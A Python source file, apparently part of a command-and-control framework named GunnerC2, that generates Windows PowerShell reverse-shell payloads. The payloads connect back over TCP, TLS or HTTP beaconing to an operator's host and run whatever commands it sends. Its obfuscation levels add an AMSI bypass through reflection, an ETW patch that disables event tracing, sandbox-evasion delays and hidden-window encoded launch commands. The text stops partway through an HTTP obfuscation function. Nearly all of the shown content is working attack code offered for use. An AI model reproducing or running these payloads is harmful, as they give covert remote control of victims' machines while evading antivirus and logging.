"""
Payload Generator for GunnerC2
Provides Windows PowerShell reverse shells over TCP and HTTP,
with selectable obfuscation levels.
"""
import base64
import random
import string
import pyperclip
import re

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def generate_windows_powershell_tcp(ip, port, obs, use_ssl, no_child=None):
    """
    Generate a Windows PowerShell TCP reverse shell using ReadLine() buffering.
    obs: 1 (raw), 2 (Base64 Encoded), 3 (variable split obfuscation)
    """

    if use_ssl:
        raw = (
            f"$h='{ip}';$p={port};"
            "$c=New-Object System.Net.Sockets.TCPClient;"
            "$c.Connect($h,$p);"
            "$ssl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,({$true}));"
            "$ssl.AuthenticateAsClient($h);"
            "$sr=New-Object System.IO.StreamReader($ssl,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ssl,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd=$sr.ReadLine())){"
            "if(!$cmd){continue};"
            "try{$o=Invoke-Expression $cmd | Out-String}catch{$o=$_.Exception.Message};"
            "$o=$o -replace '^\\s+|\\s+$','';"
            "$sw.WriteLine($o)};"
            "$ssl.Close();$c.Close();"
        )
    else:
        raw = (
            f"$h='{ip}';$p={port};"
            "$c=New-Object System.Net.Sockets.TCPClient;"
            "$c.Connect($h,$p);"
            "$ns=$c.GetStream();"
            "$sr=New-Object System.IO.StreamReader($ns,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ns,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd=$sr.ReadLine())){"
            "if(!$cmd){continue};"
            "try{$o=Invoke-Expression $cmd | Out-String}catch{$o=$_.Exception.Message};"
            "$o=$o -replace '^\\s+|\\s+$','';"
            "$sw.WriteLine($o)};"
            "$c.Close();"
        )

    encoded = base64.b64encode(raw.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    if obs is None or obs == 0:
        if not no_child:
            pyperclip.copy(final_cmd)
            print(brightyellow + final_cmd)
            print(brightgreen + "[+] Payload copied to clipboard")
            return final_cmd

        else:
            return final_cmd

    if obs == 1:
        obs1_payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port, use_ssl, no_child)
        if no_child:
            return obs1_payload

        pyperclip.copy(obs1_payload)
        print(brightyellow + obs1_payload)
        print(brightgreen + "[+] Payload copied to clipboard")
        return obs1_payload

    elif obs == 2:
        obs2_payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl, no_child)
        if no_child:
            return obs2_payload

        pyperclip.copy(obs2_payload)
        print(brightyellow + obs2_payload)
        print(brightgreen + "[+] Payload copied to clipboard")
        return obs2_payload

    elif obs == 3:
        obs3_payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl, no_child)
        if no_child:
            return obs3_payload

        pyperclip.copy(obs3_payload)
        print(brightyellow + obs3_payload)
        print(brightgreen + "[+] Payload copied to clipboard")
        return obs3_payload


def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port, use_ssl: bool = False, no_child=None):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)

    # 2) Port literal (could be math, but keep it simple)
    port_literal = str(port)

    # 3) Hand-crafted, static, obfuscated template:
    if use_ssl:
        one_liner = (
            f"$clf={ip_literal};"
            f"$prt={port_literal};"
            "$tcp=New-Object ('Sy'+'stem.Net.Sockets.TcpClient');"
            "$tcp.Connect($clf,$prt);"
            "$ssl=New-Object System.Net.Security.SslStream($tcp.GetStream(),$false,({$true}));"
            "$ssl.AuthenticateAsClient($clf);"
            "$sr=New-Object System.IO.StreamReader($ssl,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ssl,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd0=$sr.ReadLine())){"
            "if(!$cmd0){continue};"
            "try{$out1=Invoke-Expression $cmd0|Out-Str`ing}catch{$out1=$_.Exception.Message};"
            "$out1=$out1 -replace '^\\s+|\\s+$','';"
            "$sw.WriteLine($out1)};"
            "$ssl.Close();$tcp.Close();"
        )

    elif not use_ssl:
        one_liner = (
            f"$clf={ip_literal};"
            f"$prt={port_literal};"
            "$tcp=New-Object ('Sy'+'stem.Net.Sockets.TcpClient');"
            "$tcp.Connect($clf,$prt);"
            "$ns=$tcp.GetStream();"
            "$sr=New-Object System.IO.StreamReader($ns,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ns,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd0=$sr.ReadLine())){"
            "if(!$cmd0){continue};"
            "try{$out1=Invoke-Expression $cmd0|Out-Str`ing}catch{$out1=$_.Exception.Message};"
            "$out1=$out1 -replace '^\\s+|\\s+$','';"
            "$sw.WriteLine($out1)"
            "};"
            "$tcp.Close();"
        )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    encoded_one_liner = base64.b64encode(one_liner.encode('utf-16le')).decode()
    if not no_child:
        run_encoded = f"$KpTz='{encoded_one_liner}';$ZpxL=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($KpTz));IEX $ZpxL"

    else:
        run_encoded = encoded_one_liner

    return run_encoded


def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl: bool = False, no_child=None):
    """
    Level 2: heavy obfuscation plus AMSI bypass via reflection.
    Embeds the provided one-liner and returns a fully EncodedCommand.
    """
    # build the "'192'+'.'+'168'+...+''" style IP literal
    ip_parts    = ip.split('.')
    ip_literal  = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    if use_ssl:
        one_liner = (
        # AMSI bypass via reflection
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
        "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"

        # build type names
        "$A=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
        "$S=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,"
        "121,46,83,115,108,83,116,114,101,97,109));"
        "$C=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,"
        "97,100,101,114));"
        "$W=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,"
        "105,116,101,114));"

        # dynamic IP/port
        f"$ip={ip_literal};"
        f"$port={port_literal};"

        # TCP + SSL connect
        "$client=New-Object -TypeName $A;"
        "$client.Connect($ip,$port);"
        "$ssl=New-Object -TypeName $S -ArgumentList @($client.GetStream(),$false, ({$true}));"
        "$ssl.AuthenticateAsClient($ip);"
        "$reader=New-Object -TypeName $C -ArgumentList @($ssl,[System.Text.Encoding]::UTF8);"
        "$writer=New-Object -TypeName $W -ArgumentList @($ssl,[System.Text.Encoding]::UTF8);"
        "$writer.AutoFlush=$true;"

        # shell loop
        "$iex=('Invo'+'ke-Expre'+'ssion');"
        "while($cmd=$reader.ReadLine()){if(!$cmd){continue};"
        "try{$out=& $iex $cmd|Out-Str`ing}catch{$out=$_.Exception.Message};"
        "$clean=($out -replace '^\\\\s+|\\\\s+$','');"
        "$writer.WriteLine($clean)};"
        "$ssl.Close();$client.Close();"
        )

    elif not use_ssl:
        one_liner = (
        # AMSI bypass via reflection
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
        "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"

        # build type names
        "$A=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
        "$C=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,"
        "97,100,101,114));"
        "$W=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,"
        "105,116,101,114));"

        # dynamic IP/port
        f"$ip={ip_literal};"
        f"$port={port_literal};"

        # raw TCP connect
        "$client=New-Object -TypeName $A;"
        "$client.Connect($ip,$port);"
        "$ns=$client.GetStream();"
        "$reader=New-Object -TypeName $C -ArgumentList @($ns,[System.Text.Encoding]::UTF8);"
        "$writer=New-Object -TypeName $W -ArgumentList @($ns,[System.Text.Encoding]::UTF8);"
        "$writer.AutoFlush=$true;"

        # shell loop
        "$iex=('Invo'+'ke-Expre'+'ssion');"
        "while($cmd=$reader.ReadLine()){if(!$cmd){continue};"
        "try{$out=& $iex $cmd|Out-Str`ing}catch{$out=$_.Exception.Message};"
        "$clean=($out -replace '^\\\\s+|\\\\s+$','');"
        "$writer.WriteLine($clean)};"
        "$client.Close()"
        )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    # encode for PowerShell -EncodedCommand
    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    return final_cmd

def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl: bool = False, no_child=None):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    # Generate random variable names for some basic anti-sig obfuscation
    rnd = lambda: ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4,8)))
    v_amsi = rnd()
    v_etw = rnd()
    v_tcp = rnd()
    v_reader = rnd()
    v_writer = rnd()
    v_ssl = rnd()
    v_cmd = rnd()
    v_out = rnd()
    v_bytes = rnd()

    if use_ssl:
        one_liner = (
            # AMSI bypass (unchanged)
            "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
            "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
            "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
            "$n='Non'+'Public';"
            "$s='Static';"
            "$f=$e.GetField(([string]::Join('',[char[]]"
            "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
            "$t=[type[]]@([object],[bool]);"
            "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
            "$m.Invoke($f,@($null,$true));"

            # Random sleep for sandbox jitter
            "Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2000);"

            # Build type names using char arrays
            "$A = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
            "$S = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,121,46,83,115,108,83,116,114,101,97,109));"
            "$C = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114));"
            "$W = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,105,116,101,114));"
            "$Q=[string]::Join('',[char[]]"
            "(83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,"
            "121,46,83,115,108,83,116,114,101,97,109));"

            # dynamic IP/port
            f"$ip={ip_literal};"
            f"$port={port_literal};"

            # TCP + TLS connection with cert‐validation bypass & TLS1.2
            "$client = New-Object -TypeName $A;"
            "$client.Connect($ip, $port);"
            "$ssl=New-Object -TypeName $Q -ArgumentList @($client.GetStream(),$false,({$true}));"
            "$ssl.AuthenticateAsClient($ip, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);"

            # Reader/Writer
            "$reader = New-Object -TypeName $C -ArgumentList @($ssl, [System.Text.Encoding]::UTF8);"
            "$writer = New-Object -TypeName $W -ArgumentList @($ssl, [System.Text.Encoding]::UTF8);"
            "$writer.AutoFlush = $true;"

            # Shell loop with preferred execution method
            "while ($cmd = $reader.ReadLine()) {"
            "if (!$cmd) { continue };"
            "try { $out = [ScriptBlock]::Create($cmd).Invoke() | Out-String }"
            "catch { $out = $_.Exception.Message };"
            "$clean = ($out -replace '^\\s+|\\s+$','');"
            "$writer.WriteLine($clean)"
            "}"

            # Cleanup
            "$ssl.Close();"
            "$client.Close();"

            # ETW bypass dynamic offset calculation
            "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
            "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
            "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
            "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
            "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
            "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
            "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
            "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
            "$peOff=$ntbase.ToInt64()+0x3C;"
            "$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
            "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
            "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
            "$exptVA=$ntbase.ToInt64()+$expt;"
            "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
            "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
            "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
            "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
            "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
            "$namePtr=($ntbase.ToInt64()+$nameRVA);"
            "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++)"
            "{$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};"
            "$etwAddr=[IntPtr]$etwptr;"
            "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        )

    elif not use_ssl:
        one_liner = (
            # AMSI bypass (unchanged)
            "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
            "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
            "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
            "$n='Non'+'Public';"
            "$s='Static';"
            "$f=$e.GetField(([string]::Join('',[char[]]"
            "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
            "$t=[type[]]@([object],[bool]);"
            "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
            "$m.Invoke($f,@($null,$true));"

            # Random sleep for sandbox jitter
            "Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2000);"

            # Build type names using char arrays
            "$A = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
            "$C = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114));"
            "$W = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,105,116,101,114));"

            # dynamic IP/port
            f"$ip={ip_literal};"
            f"$port={port_literal};"

            # raw TCP connection
            "$client = New-Object -TypeName $A;"
            "$client.Connect($ip, $port);"
            "$ns = $client.GetStream();"
            "$reader = New-Object -TypeName $C -ArgumentList @($ns, [System.Text.Encoding]::UTF8);"
            "$writer = New-Object -TypeName $W -ArgumentList @($ns, [System.Text.Encoding]::UTF8);"
            "$writer.AutoFlush = $true;"

            # Shell loop with preferred execution method
            "while ($cmd = $reader.ReadLine()) {"
            "if (!$cmd) { continue };"
            "try { $out = [ScriptBlock]::Create($cmd).Invoke() | Out-String }"
            "catch { $out = $_.Exception.Message };"
            "$clean = ($out -replace '^\\s+|\\s+$','');"
            "$writer.WriteLine($clean)"
            "}"

            # Cleanup
            "$client.Close();"

            # ETW bypass dynamic offset calculation
            "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
            "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
            "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
            "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
            "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
            "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
            "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
            "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
            "$peOff=$ntbase.ToInt64()+0x3C;"
            "$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
            "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
            "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
            "$exptVA=$ntbase.ToInt64()+$expt;"
            "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
            "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
            "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
            "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
            "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
            "$namePtr=($ntbase.ToInt64()+$nameRVA);"
            "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++)"
            "{$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};"
            "$etwAddr=[IntPtr]$etwptr;"
            "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    return final_cmd


def generate_windows_powershell_http(ip, port, beacon_interval, obs, no_child=None):
    beacon_url = f"http://{ip}:{port}/"
    interval = beacon_interval

    raw = (
        f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
        f"$sid=G-SID;$uri='{beacon_url}';"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
        "$hdr=@{'X-Session-ID'=$sid};"

        # Define Get-Task
        "Function Get-Task {"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'GET';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$resp = $req.GetResponse();"
        "$stream = $resp.GetResponseStream();"
        "$reader = New-Object System.IO.StreamReader($stream);"
        "$result = $reader.ReadToEnd();"
        "$reader.Close();$stream.Close();$resp.Close();"
        "return $result"
        "};"

        # Define Send-Output
        "Function Send-Output($payload) {"
        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'POST';"
        "$req.ContentType = 'application/json';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$req.ContentLength = $bytes.Length;"
        "$stream = $req.GetRequestStream();"
        "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
        "$resp = $req.GetResponse();$resp.Close()"
        "};"

        # Init PS pipeline
        "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
        "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
        "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

        # Beacon loop
        "while($true){"
        "try{"
        "$taskJson = Get-Task;"
        "$task = ConvertFrom-Json $taskJson;"
        "if($task.cmd){"
        "$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
        "$pipeline.Commands.Clear();"
        "$pipeline.AddScript($cmd)|Out-Null;"
        "$results = $pipeline.Invoke();"
        "$output = $results|Out-String;"
        "$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
        "$body = @{output=$b64}|ConvertTo-Json;"
        "Send-Output $body;"
        "}"
        "}catch{};"
        f"Start-Sleep -Seconds {interval};"
        "}"
    )

    encoded = base64.b64encode(raw.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    if obs is None or obs == 0:
        pyperclip.copy(final_cmd)
        print(brightyellow + final_cmd)
        print(brightgreen + "[+] Payload copied to clipboard")
        return final_cmd


    if obs == 1:
        obs1_http_payload = generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval, no_child)
        if no_child:
            return obs1_http_payload

        pyperclip.copy(obs1_http_payload)
        print(brightyellow + obs1_http_payload)
        print(brightgreen + "[+] Payload copied to clipboard")
        return obs1_http_payload
    elif obs == 2:
        obs2_http_payload = generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval, no_child)
        if no_child:
            obs2_http_payload

        pyperclip.copy(obs2_http_payload)
        print(brightyellow + obs2_http_payload)
        print(brightgreen + "[+] Payload copied to clipboard")
        return obs2_http_payload
    """else:
        return _obfuscate_level3(template)"""


def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval, no_child=None):
    beacon_url = f"http://{ip}:{port}/"
    interval = beacon_interval

    one_liner = (
    f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
    f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
    f"$sid=G-SID;$uri='{beacon_url}';"
    f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
    f"$hdr=@{{'X-Session-ID'=$sid}};"

    # AMSI bypass
    "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
    "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
    "$n='Non'+'Public';$s='Static';"
    "$f=$e.GetField(([string]::Join('',[char[]]"
    "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
    "$t=[type[]]@([object],[bool]);"
    "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
    "$m.Invoke($f,@($null,$true));"

    # ETW bypass
    "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
    "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
    "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
    "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
    "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
    "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
    "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
    "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
    "$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
    "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
    "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
    "$exptVA=$ntbase.ToInt64()+$expt;"
    "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
    "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
    "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
    "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
    "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
    "$namePtr=($ntbase.ToInt64()+$nameRVA);"
    "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
    "if($currName-eq$e){$etwptr=$namePtr;break}};"
    "$etwAddr=[IntPtr]$etwptr;"
    "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
    "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

    # Define GET using .NET
    "Function Get-Task {"
    "$req = [System.Net.HttpWebRequest]::Create($uri);"
    "$req.Method = 'GET';"
    "$req.Headers.Add('X-Session-ID',$sid);"
    "$resp = $req.GetResponse();"
    "$stream = $resp.GetResponseStream();"
    "$reader = New-Object System.IO.StreamReader($stream);"
    "$result = $reader.ReadToEnd();"
    "$reader.Close();$stream.Close();$resp.Close();"
    "return $result"
    "}"

    # Define POST using .NET
    "Function Send-Output($payload) {"
    "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
    "$req = [System.Net.HttpWebRequest]::Create($uri);"
    "$req.Method = 'POST';"
    "$req.ContentType = 'application/json';"
    "$req.Headers.Add('X-Session-ID',$sid);"
    "$req.ContentLength = $bytes.Length;"
    "$stream = $req.GetRequestStream();"
    "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
    "$resp = $req.GetResponse();$resp.Close()"
    "}"

    # PowerShell pipeline init
    "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
    "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
    "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

    # Beacon loop
    f"while($true){{"
    "try{"
    "    $taskJson = Get-Task;"
    "    $task = ConvertFrom-Json $taskJson;"
    "    if($task.cmd){"
    "        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
    "        $pipeline.Commands.Clear();"
    "        $pipeline.AddScript($cmd)|Out-Null;"
    "        $results = $pipeline.Invoke();"
    "        $output = $results|Out-String;"
    "        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
    "        $body = @{output=$b64}|ConvertTo-Json;"
    "        Send-Output $body;"
    "    };"
    "}"
    "catch{};"
    f"Start-Sleep -Seconds {interval};"
    "}"
)

    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    return final_cmd


def generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval, no_child=None):
    """
    HTTP-based Windows reverse shell, with randomized PHP endpoints,
    fake browser headers, obfuscated C2 header keys and System.Text.Json parsing.
    """
    # list of fake .php pages
